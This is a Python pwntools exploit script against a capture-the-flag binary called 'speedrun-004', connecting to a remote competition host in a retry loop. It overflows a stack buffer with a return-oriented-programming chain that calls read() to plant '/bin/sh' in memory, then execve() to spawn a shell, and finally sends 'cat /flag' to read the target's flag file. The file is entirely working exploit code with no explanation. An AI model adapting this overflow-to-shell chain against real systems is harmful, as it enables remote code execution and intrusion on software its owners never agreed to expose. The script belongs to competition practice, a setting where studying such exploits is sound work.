from pwn import *

POP_RDI = 0x400686
POP_RSI = 0x410a93
POP_RDX = 0x44c6b6
POP_RAX = 0x415f04
SYSCALL = 0x474f15
BUFFER = 0x6b90e0

while True:
	# r = process('./speedrun-004', env={'DEBUG': ''})
	r = remote('speedrun-004.quals2019.oooverflow.io', 31337)

	payload = ''
	payload += 'A' * 0x38
	payload += p64(POP_RDI)
	payload += p64(0)
	payload += p64(POP_RSI)
	payload += p64(BUFFER)
	payload += p64(POP_RDX)
	payload += p64(0x10)
	payload += p64(POP_RAX)
	payload += p64(0)
	payload += p64(SYSCALL)	# read(0, BUFFER, 0x10);
	payload += p64(POP_RDI)
	payload += p64(BUFFER)
	payload += p64(POP_RSI)
	payload += p64(0)
	payload += p64(POP_RDX)
	payload += p64(0)
	payload += p64(POP_RAX)
	payload += p64(0x3b)
	payload += p64(SYSCALL)	# execve(BUFFER, NULL, NULL);
	payload += 'A' * (0x100 - len(payload))
	payload += '\x00'

	assert(len(payload) <= 0x101)

	try:
		r.sendlineafter('how much do you have to say?\n', str(len(payload)))
		r.sendafter('Ok, what do you have to say for yourself?', payload)

		r.recvuntil('I\'ll take it into consideration.\n')
		r.sendline('/bin/sh\x00')

		r.sendline('cat /flag')
	except:
		r.close()

	r.interactive()
